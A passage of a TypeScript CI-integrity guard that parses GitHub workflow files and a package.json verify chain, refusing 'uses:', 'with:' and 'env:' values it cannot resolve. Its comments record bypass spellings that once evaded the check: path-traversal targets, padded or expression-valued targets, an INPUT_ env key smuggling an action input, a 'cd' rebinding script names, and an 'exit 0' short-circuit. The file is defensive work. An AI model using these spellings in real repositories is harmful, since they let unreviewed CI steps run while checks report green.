 * `.github/actions/foo` has no `@ref`, so it cannot reach this arm however it
 * is written.
 *
 * The owner must start alphanumeric, so a first segment beginning with a dot is
 * not an owner. A segment that is empty, `.` or `..` is refused by name: those
 * are what make bytes a path, and a path is the other arm's business.
 */
function isThirdPartyAction(target: string): boolean {
  const split = target.indexOf('@');
  if (split <= 0) return false;
  const ref = target.slice(split + 1);
  if (ref === '' || ref.includes('@') || /\s/u.test(ref)) return false;
  const segments = target.slice(0, split).split('/');
  if (segments.length < 2) return false;
  if (!/^[A-Za-z0-9][A-Za-z0-9-]*$/u.test(segments[0] ?? '')) return false;
  return segments
    .slice(1)
    .every((segment) => segment !== '.' && segment !== '..' && /^[A-Za-z0-9._-]+$/u.test(segment));
}

/**
 * A `uses:` that reaches commands this reader cannot see, refused by name.
 *
 * `uses:` is how a workflow runs somebody else's steps, so the whole of this
 * function is one question: **can this reader say what the target is, and has
 * it read the steps?** It is written as a default refusal with two allow-arms,
 * and each arm now names a fact instead of a spelling. That inversion is defect
 * eleven.
 *
 * The two shapes that are allowed through:
 *
 * - `owner/repo[/path…]@ref` that is **also one of the exact strings in
 *   {@link THIRD_PARTY_ACTIONS}**, an action in another repository that
 *   somebody has read. What the action itself runs is out of reach on purpose;
 *   what this repository hands it under `with:` is not, and defect sixteen is
 *   that the second half went unasked. Two facts, not one: {@link
 *   isThirdPartyAction} says these bytes name an action elsewhere, and the pin
 *   says which one.
 * - a `./…` path that **normalises onto a file this run actually enumerated**.
 *   That is the local reusable workflow case, and the admission rests on a set
 *   membership rather than on a sentence: every member of `readWorkflows` is a
 *   file {@link readWorkflowSurface} read and handed to {@link modelOf}, so its
 *   jobs reach {@link JOBS} under their own file's name.
 *
 * A remote reusable workflow (`….yml@ref`) would match the first shape, and is
 * refused ahead of it: its jobs run as part of this CI and are in no model here.
 *
 * ### Defect eleven: the arms decided a target they had never resolved
 *
 * The previous version asked a *textual* question — "does this string start
 * with `./` or `../`, or match `.yml@`?" — in place of the real one, and so
 * classified as a harmless third-party action every target that missed all
 * three patterns. Measured on the tree that carried the fixes for seven to ten,
 * each construction twice, each **117/117 green**, while the control spelling
 * `./.github/actions/probe-composite` was red twice on that same tree:
 *
 *     - uses: ./.github/workflows/../actions/probe-composite/action.yml
 *     - uses: " ./.github/actions/probe-composite"
 *     - uses: .github/actions/probe-composite
 *
 * and, at job level, `uses: ./.github/workflows/../../shared-ci/gates.yml` with
 * `secrets: inherit` — an entire reusable workflow whose jobs contribute no
 * commands to any model here.
 *
 * It is defect eight's shape one level down. Eight was `run:` refusing an
 * unreadable value while `uses:` admitted it; eleven is `uses:` refusing one
 * spelling of a target while admitting four other spellings of the same target.
 * The old doc comment stated the admission's justification outright —
 * "enumerating the directory already read it" — and that sentence was false for
 * every input above. The fix is therefore to *check* the sentence, not to
 * soften it.
 *
 * The value arriving here is what the YAML parser resolved, so quoting, a value
 * written on the next line and a block scalar are all one string by the time
 * this is asked. Defects two, three and four are all upstream of here now.
 * Surrounding whitespace is refused rather than trimmed: whether the runner
 * trims it is not written in this file, and a single leading space is what
 * defeated the old `startsWith('./')`.
 */
function refuseUses(
  where: string,
  line: number,
  target: string,
  readWorkflows: ReadonlySet<string>,
): ThirdPartyAction | undefined {
  const at = `${where}:${String(line + 1)}`;
  if (target === '') throw new Error(`${at} has a "uses:" with no target this reader can read`);

  // Defect eleven's cheapest spelling: `uses: " ./.github/actions/probe"` is a
  // double-quoted scalar whose value keeps the leading space, which is enough to
  // defeat any prefix test. Trimming it here would be this reader deciding what
  // the runner does with the space; refusing says it does not know.
  if (target !== target.trim()) {
    throw new Error(
      `${at} has a "uses:" padded with whitespace: "${target}". Whether the ` +
        'runner trims that is not written in this file, and the two readings ' +
        'name different targets, so this reader refuses rather than pick one.',
    );
  }

  // Defect eight. `run:` has refused a GitHub expression since defect four —
  // "what it runs is not in this file" — and `uses:` did not, so the identical
  // unreadable value was refused in one key and admitted in the other. Measured
  // on the tree of 91 that carried the fix for four to six, twice:
  // `uses: ${{ env.PROBE_ACTION }}` added to two steps left
  // the file 91/91 green, and the arms below decided a target they had not read.
  //
  // Whether GitHub's own parser would run that step is not the question this
  // reader gets to answer, and deliberately so: the value is not in the file, so
  // there is nothing here to read, and a reader that cannot see a value must
  // refuse rather than report that it found nothing harmless.
  if (target.includes('${{')) {
    throw new Error(
      `${at} has a "uses:" whose target is a GitHub expression: ${target}. What it ` +
        'names is not in this file, so this reader cannot tell a third-party ' +
        'action from a composite action in this repository whose own steps would ' +
        'go unread. Write the target out.',
    );
  }

  // Case-insensitive, and that is round two's second finding rather than a
  // flourish: with `/\.ya?ml@/u`, `other-org/shared-ci/.github/workflows/
  // gates.YML@main` was 141/141 green twice while the byte-identical target
  // spelled `gates.yml@main` was red twice. One referent, two spellings,
  // opposite verdicts, inside the function the round-two commit message says it
  // converted from a spelling question to a fact. Whether GitHub accepts the
  // uppercase extension was not established here and does not need to be: under
  // either answer this arm now gives the same verdict to the same target.
  if (/\.ya?ml@/iu.test(target)) {
    throw new Error(
      `${at} calls "${target}", a reusable workflow in another repository. Its ` +
        'jobs run as part of this CI and are not in this directory, so this ' +
        'reader cannot see them. Teach it to read them, or keep the workflow ' +
        'local; do not let it go unread.',
    );
  }

  // Two facts, not one, for the reason the local arm gives below. The shape test
  // says these bytes name an action in another repository; the pin says *which*
  // action, and therefore what may be handed to it under `with:`. Defect
  // sixteen is that only the first was ever asked.
  if (isThirdPartyAction(target)) {
    const pinned = THIRD_PARTY_ACTIONS.find((action) => action.uses === target);
    if (pinned !== undefined) return pinned;
    throw new Error(
      `${at} uses "${target}", a well-formed reference to an action in another ` +
        'repository that this guard has never been told about. What an action ' +
        'runs is out of reach here, and what a workflow hands it under "with:" ' +
        'is not — so an unpinned action is an unbounded amount of CI this file ' +
        'would report as read. Add it to THIRD_PARTY_ACTIONS with the inputs ' +
        'this repository gives it.',
    );
  }

  // The only other thing a `uses:` may be is a reference into this repository,
  // which GitHub spells `./path/from/the/repository/root`. So: resolve the path
  // and ask the enumeration whether it read that file, instead of asking the
  // bytes what they look like. Both halves matter. Without the `./` test a
  // target that merely *resolves* onto a workflow file would be admitted as
  // local when it is not spelled as a local reference; without the set the `./`
  // test admits any path at all, which is defect eleven.
  const resolved = target.startsWith('./') ? normaliseUsesPath(target) : undefined;
  if (resolved !== undefined && readWorkflows.has(resolved)) {
    // Two facts, not one. The set says the file was read; this says the bytes
    // are the plain path to it, so a target carrying a redundant dot segment,
    // a trailing slash or a doubled separator is refused even though every one
    // of those normalises onto a file that was read. Measured on the tree that
    // shipped after round two, twice each: all three, pointed at the real
    // workflow, take the file down at module load, while the plain path leaves
    // it 141/141 green. The reader has no way to know which reading the
    // runner takes, and the cost of asking for the plain spelling is a review
    // while the cost of guessing is a gate.
    if (target === `./${resolved}`) return;
    throw new Error(
      `${at} names "${target}", which resolves onto "${resolved}" — a file this ` +
        'run did read, but not written as the plain path to it. This reader will ' +
        'not decide which of the two readings the runner takes. Write the plain ' +
        'path.',
    );
  }

  throw new Error(
    `${at} has a "uses:" this reader cannot place: "${target}"` +
      (resolved === undefined ? '' : `, which as a path resolves to "${resolved}"`) +
      '. It is neither a well-formed owner/repo[/path]@ref nor a "./" path onto ' +
      'one of the workflow files this run enumerated, so whatever steps or jobs ' +
      'it brings in have gone unread. Teach this reader to read that target, or ' +
      'put the gate in a workflow step; do not let it go unread.',
  );
}

/**
 * A `with:` is admitted only where this reader can say what receives it, and
 * only with the keys that receiver is pinned as taking.
 *
 * `with:` was in {@link STEP_KEYS} and {@link JOB_KEYS} as a key this reader
 * "knows": `parseWorkflowYaml` consumed every line of it, so the totality claim
 * held *textually* — nothing was walked past — and the value was then compared
 * with nothing. `actions/github-script@v7` takes a `with: script:` and runs it,
 * so two commands written under that key were CI commands sitting in the file
 * the reader had just parsed, contributing nothing to {@link COMMANDS}. That is
 * defect sixteen, and it is defect nine's sentence one more time: listing a
 * key as known is not knowing what it does.
 *
 * The refusal is the default here too. A `with:` on anything but a pinned
 * third-party action names a receiver this reader has not read the inputs of,
 * and a key not in that action's `inputs` is an input nobody decided about.
 */
function refuseWith(at: string, action: ThirdPartyAction | undefined, node: YamlNode | undefined): void {
  if (node === undefined) return;
  if (action === undefined) {
    throw new Error(
      `${at} has a "with:" this reader cannot attach to anything it has read. ` +
        'Inputs go to the target of a "uses:", and the only targets whose inputs ' +
        'are written down here are the pinned actions in THIRD_PARTY_ACTIONS.',
    );
  }
  const entries = mappingOf(node);
  if (entries === undefined) {
    throw new Error(`${at} has a "with:" that is not a mapping this reader can take apart`);
  }
  for (const { key } of entries) {
    if (!action.inputs.includes(key)) {
      throw new Error(
        `${at} hands "${action.uses}" an input this guard has not been told ` +
          `about: "${key}". An action's inputs are the other half of what it ` +
          'runs — `actions/github-script` takes a `script:` and executes it — so ' +
          'a new input is a new piece of CI. Decide what it is, then add it to ' +
          'that action\'s entry in THIRD_PARTY_ACTIONS.',
      );
    }
  }
}

/**
 * An `env:` on a step or job that has a `uses:` is refused, because it is a
 * second spelling of the `with:` {@link refuseWith} just bounded.
 *
 * ### Defect twenty-one: the pin bounded one of the two keys that reach an input
 *
 * Defect sixteen's fix pins five actions and the `with:` keys each may carry,
 * and the header stated that pin as **the** bound on what a workflow hands an
 * admitted action. GitHub passes a `with:` input to an action as the environment
 * variable `INPUT_<NAME>`, so `env:` on the same step is the same channel
 * written the other way — and `refuseWith` read only one of the two. Measured on
 * the tree that shipped after round three, twice:
 *
 *     - uses: pnpm/action-setup@v4
 *       env:
 *         INPUT_RUN_INSTALL: |
 *           - args: [--frozen-lockfile]
 *       with:
 *         version: 10
 *
 * was `172 passed (172)`, exit 0, while the byte-equivalent input written as
 * `with: run_install:` on the same step was red twice by name. One action, one
 * input, two spellings, opposite verdicts — inside the function written to close
 * exactly that, on the key next door.
 *
 * **Whether GitHub's runner really feeds `env: INPUT_X` to an action as its `x`
 * input was not established here**, and this refusal does not depend on it. It
 * is the rule the header states for an error that is unsafe under one answer: if
 * the runner does consume it, admitting it hands a pinned action an input nobody
 * decided about with this file green; if it does not, refusing costs a review.
 * The reader has no fact either way, so it refuses rather than guessing in the
 * direction that happens to be quiet.
 *
 * `env:` on a **`run:`** step is untouched and stays disclosed in the header's
 * "cannot see" list. The two are not the same question: a `run:` step's text is
 * compared with {@link CI_GATES} by equality, so what an `env:` can do there is
 * change what an already-listed command means; a `uses:` step has no command
 * text at all, and every one of the header's three `env:` sentences argued from
 * command text, which is why none of them covered this.
 *
 * Read by {@link modelOf}, at both levels, and by *an env: on a uses: step is
 * the with: pin written the other way — defect twenty-one*. Load-bearing,
 * measured on the tree this comment ships in, twice: making this a no-op is
 * `1 failed | 195 passed (196)`, exit 1 twice, at that case — `ci.yml` carries
 * no `env:` on a `uses:` step, so nothing else in the file sees it. That red is
 * now on the *message* rather than on the absence of a throw:
 * {@link refuseActionInputEnv} catches an `INPUT_`-shaped key at any scope, so
 * what only this function refuses is an **ordinary** key on a `uses:` step,
 * which is the second row of that case.
 */
function refuseEnvOnUses(at: string, uses: string | undefined, node: YamlNode | undefined): void {
  if (node === undefined || uses === undefined) return;
  const keys = mappingOf(node)?.map(({ key }) => key) ?? [];
  throw new Error(
    `${at} sets "env:" on a step whose work is "${uses}". GitHub hands a "with:" ` +
      'input to an action as the environment variable INPUT_<NAME>, so this is ' +
      'the key THIRD_PARTY_ACTIONS pins, spelled the other way' +
      (keys.length === 0 ? '' : `: ${keys.join(', ')}`) +
      '. Write the input under "with:", where the pin can see it.',
  );
}

/** Everything in `.github/workflows/`, split into what runs and what does not. */
interface WorkflowSurface {
  /** Loadable files, relative to the directory, sorted. */
  readonly files: readonly string[];
  /** Present but with an extension the runner ignores, same form. */
  readonly ignoredFiles: readonly string[];
  /**
   * Every pinned third-party action any workflow admitted, sorted, without
   * repeats. Read by *every pinned third-party action is one the workflows
   * really use*, and by nothing else.
   */
  readonly actions: readonly string[];
  readonly models: readonly WorkflowModel[];
}

/** Every file under a directory, recursively, as `/`-joined relative paths. */
function filesUnder(absolute: string, prefix: string, into: string[]): void {
  for (const item of readdirSync(absolute, { withFileTypes: true })) {
    const relative = prefix === '' ? item.name : `${prefix}/${item.name}`;
    if (item.isDirectory()) filesUnder(join(absolute, item.name), relative, into);
    else into.push(relative);
  }
}

/**
 * Read the whole directory.
 *
 * `readdirSync` throws when `repoRoot` is wrong, which is the behaviour wanted:
 * the failure that must never happen here is the one where a mis-rooted read
 * finds no workflows and every assertion above passes over an empty union.
 *
 * GitHub picks up workflows at the top level of `.github/workflows/` only; this
 * recurses, so a nested `.yml` is parsed and counted even though the runner
 * would ignore it. Over-reporting costs a review; under-reporting is the defect.
 */
function readWorkflowSurface(repoRoot: string): WorkflowSurface {
  const directory = join(repoRoot, ...WORKFLOW_DIRECTORY);
  const found: string[] = [];
  filesUnder(directory, '', found);

  const files: string[] = [];
  const ignoredFiles: string[] = [];
  for (const path of found.sort()) {
    const extension = path.slice(path.lastIndexOf('.'));
    if (LOADED_EXTENSIONS.includes(extension as (typeof LOADED_EXTENSIONS)[number])) files.push(path);
    else ignoredFiles.push(path);
  }

  // The set of files the enumeration read, in the form a `uses:` names them:
  // relative to the repository root. Built before any parse, so every file in
  // the directory is in it by the time the first `uses:` is judged, and read by
  // `refuseUses` through `modelOf`. This is the whole of the fix for defect
  // eleven at the wiring: the old allow-branch asserted that the enumeration had
  // read the target, and nothing carried the enumeration to the place that
  // asserted it.
  const readWorkflows: ReadonlySet<string> = new Set(
    files.map((file) => `${WORKFLOW_DIRECTORY.join('/')}/${file}`),
  );

  const models = files.map((file) =>
    modelOf({ file, text: readFileSync(join(directory, ...file.split('/')), 'utf8') }, readWorkflows),
  );

  const actions = [...new Set(models.flatMap((model) => model.actions))].sort();
  return { files, ignoredFiles, actions, models };
}

const SURFACE = readWorkflowSurface(REPO_ROOT);

/** Every job CI runs, across every workflow. */
const JOBS: readonly WorkflowJob[] = SURFACE.models.flatMap((model) => model.jobs);

/** Every simple command CI runs, across every workflow. */
/**
 * Every simple command of every job, tagged with where it runs.
 *
 * A named function because the *rule* being testable is not the same as the
 * *wiring* being testable, and that distinction was measured too: after
 * {@link unenforcedGates} was extracted and given cases of its own, putting
 * defect ten straight back here — dropping `gating` on the way through, exactly
 * as the old `.map(c => c.text)` did — was still 116/116 green, twice, on the
 * tree of 116 that carried it. A rule
 * with no path from the document to its input asserts nothing about the
 * document. Its cases are in *carries the gating flag from the parsed step into
 * the command list*.
 */
function commandsOf(jobs: readonly WorkflowJob[]): WorkflowCommand[] {
  return jobs.flatMap((job) =>
    job.commands.map(
      ({ text, gating, reached }): WorkflowCommand => ({
        file: job.file,
        job: job.name,
        command: text,
        gating,
        reached,
      }),
    ),
  );
}

const COMMANDS: readonly WorkflowCommand[] = commandsOf(JOBS);

/* -------------------------------------------------------------------------- */
/* the verify chain                                                           */
/* -------------------------------------------------------------------------- */

/** One command `pnpm verify` runs, and the script whose body carries it. */
interface VerifyCommand {
  readonly script: string;
  readonly command: ParsedCommand;
  readonly gating: boolean;
  /**
   * Whether every green run of `pnpm verify` executes this command. False for a
   * command written on the right of a `||`, and false for everything inside a
   * script that was itself invoked there. Read in three places, and by nothing
   * else: the `verify reaches the CI gate` case, which demands
   * `gating && reached`; *a gate on the right of a || is present, gating, and
   * not reached*; and *does not accept an invocation it has never been told runs
   * and returns*, which asserts `e.gating && e.reached` on the spliced chain. A
   * previous version of this sentence named the first two and stopped, without
   * the "and by nothing else" this file attaches wherever it means exhaustive —
   * so it was incomplete rather than false. Defect twelve.
   */
  readonly reached: boolean;
  /**
   * Whether a `cd` runs in front of this command on the path from `verify` to
   * it — so the working directory it executes in is **not** the repository root,
   * and this reader cannot say which `package.json` a `pnpm <name>` here binds
   * to.
   *
   * ### Defect nineteen: `chainOf`'s edge was an unchecked referential claim
   *
   * Every row above rests on one sentence: "`pnpm typecheck` runs the body of
   * `scripts.typecheck` in the root `package.json`". `chainOf` asserted it for
   * every command in the chain, unconditionally, and nothing checked it — while
   * `cd` sat on round three's own allowlist, admitted with a comment saying out
   * loud that it "changes what the commands after it do".
   *
   * Measured on the tree that shipped after round three, twice: a `verify` of
   * `cd probe && pnpm typecheck && … && cd ../src-tauri && cargo build …`,
   * alongside a probe manifest whose eight scripts are `node -e ""`, was
   * `172 passed (172)`, exit 0. Every command parsed, every program listed,
   * every gate row satisfied — against bodies that had nothing to do with what
   * runs. The runtime half was measured too, with a read-only `pnpm run` in the
   * real worktree: `sh -c 'cd probe && pnpm typecheck'` printed
   * `> probe@1.0.0 typecheck` and ran `node -e ""`, not the root's `tsc --build
   * --force`. The guard even printed its own blindness in the mirror control's
   * failure message, listing `cd probe` among "the commands verify actually
   * runs" and then resolving the eight names after it against the root manifest
   * anyway.
   *
   * So the edge is now refused rather than followed once the working directory
   * has moved, exactly as an unknown step key is refused: `chainOf` does not
   * expand a `pnpm <name>` that is `rebound`, and
   * {@link unclassifiedVerifyCommands} reports it. `cd src-tauri` at the end of
   * the shipped chain costs nothing, because the two `cargo` gates behind it are
   * not `pnpm` edges — which is the honest reason it was affordable to draw the
   * line here rather than remove `cd` from {@link VERIFY_INVOCATIONS}.
   *
   * It composes **downwards only**, because that is what a shell does: a `cd` in
   * `verify`'s body is inherited by a script `verify` invokes after it, and a
   * `cd` inside that script's own body is not visible to `verify` when it
   * returns.
   *
   * Read by {@link chainOf} itself, by {@link unclassifiedVerifyCommands}, and
   * directly by *a pnpm script name behind a cd binds to a manifest nobody read
   * — defect nineteen*, which asserts the flag's value per command.
   * Three separate mutations, each measured on the tree this comment ships in,
   * twice, each `1 failed | 195 passed (196)` with exit 1 twice at *a pnpm
   * script name behind a cd binds to a manifest nobody read — defect nineteen*:
   * `chainOf` no longer setting the flag at a `cd`; `chainOf` setting it and
   * following the edge anyway; and {@link unclassifiedVerifyCommands} no longer
   * reporting it. The shipped chain's one `cd` has no `pnpm` behind it, so all
   * three are invisible to every other case in this file.
   */
  readonly rebound: boolean;
}

/**
 * Every command a script **writes**, tagged with whether it gates and whether
 * it runs, and with the same tagging applied through every `pnpm <script>` edge
 * it invokes.
 *
 * The old expander was `String.replace(/pnpm (?:run )?([\w:-]+)/g, …)` over the
 * concatenated bodies, which walks into an echoed string exactly as it walks
 * into a real command; see defect six. This follows the same edge the shell
 * follows: a simple command whose program is `pnpm` and whose script name is a
 * key in `scripts`. A name inside an argument is an argument.
 *
 * **What this does not do, said plainly because saying the opposite is defect
 * thirteen.** It does not compute reachability in the sense of "control flow
 * arrives here". It reads what is written and tags each command with the two
 * facts the *operators around it* determine. A command that ends the shell —
 * `exit 0` at the head of the chain — is written, gating, and marked reached,
 * and everything behind it is written, gating and marked reached too, while
 * none of it runs. Nothing in this function can see that, because seeing it
 * means knowing what `exit` is. The thing that closes it is totality, not a
 * cleverer walk: *every command "pnpm verify" runs is one this reader can
 * classify* refuses any command no {@link VERIFY_INVOCATIONS} entry
 * accepts, and `exit 0` is not one. This comment used to claim the walk returned "every command
 * **reachable** from a script, by invocation rather than by mention"; it
 * returned every command *written*, and `exit 0 && <the whole shipped chain>`
 * was 141/141 green against it.
 *
 * Non-gating and unreached commands are collected too, and marked. They are what
 * lets the failure message tell "you never added this gate" apart from "you
 * added it and something swallows its exit status" apart from "you added it
 * where it only runs if something else fails", which want different fixes.
 */
function chainOf(
  script: string,
  scripts: Record<string, string>,
  seen = new Set<string>([script]),
  reboundOnEntry = false,
): VerifyCommand[] {
  const body = scripts[script];
  if (body === undefined) return [];
  const out: VerifyCommand[] = [];
  // The working directory this body runs in, as far as this reader can tell it:
  // it is the caller's once a `cd` in front of the call moved it, and it moves
  // again at the first `cd` in this body. Defect nineteen.
  let rebound = reboundOnEntry;
  for (const segment of shellCommands(body, `package.json scripts.${script}`)) {
    const command = parseCommand(segment.text);
    out.push({ script, command, gating: segment.gating, reached: segment.reached, rebound });
    if (command.program === 'cd') rebound = true;
    if (command.program !== 'pnpm') continue;
    // A `pnpm <name>` behind a `cd` names a script in whatever manifest that
    // directory holds, which is not one this reader has read. It is left in the
    // chain, marked, and refused by `unclassifiedVerifyCommands`; following it
    // into the root manifest's body would be the unchecked claim itself.
    if (rebound) continue;
    const at = command.args[0] === 'run' ? 1 : 0;
    const name = command.args[at];
    if (name === undefined || name.startsWith('-') || !Object.hasOwn(scripts, name) || seen.has(name)) continue;
    seen.add(name);
    // Both flags compose along the edge: a gate is gating only if every
    // invocation between it and `verify` is gating, and reached only if every
    // one of them runs. `pnpm a || pnpm b` reaches `b`'s body conditionally, so
    // a gate inside `b` is not a gate `verify` runs.
    out.push(
      ...chainOf(name, scripts, seen, rebound).map((entry) => ({
        ...entry,
        gating: entry.gating && segment.gating,
        reached: entry.reached && segment.reached,
      })),
    );
  }
  return out;
}

/**
 * What `pnpm verify` actually runs.
 *
 * Read by name in three cases: the `verify reaches the CI gate` row, once per
 * row of {@link CI_GATES}; *every command "pnpm verify" runs is one this reader
 * can classify*, which is the totality net over it; and *follows a pnpm script
 * invocation into the script it invokes*, which asserts that the expansion
 * happened at all. A previous version of this sentence named only the first,
 * and the other two were added in the same commit as the sentence.
 */
const VERIFY_CHAIN: readonly VerifyCommand[] = (() => {
  if (PACKAGE.scripts.verify === undefined) {
    throw new Error('package.json has no "verify" script, so there is no local gate to compare against CI');
  }
  return chainOf('verify', PACKAGE.scripts);
})();
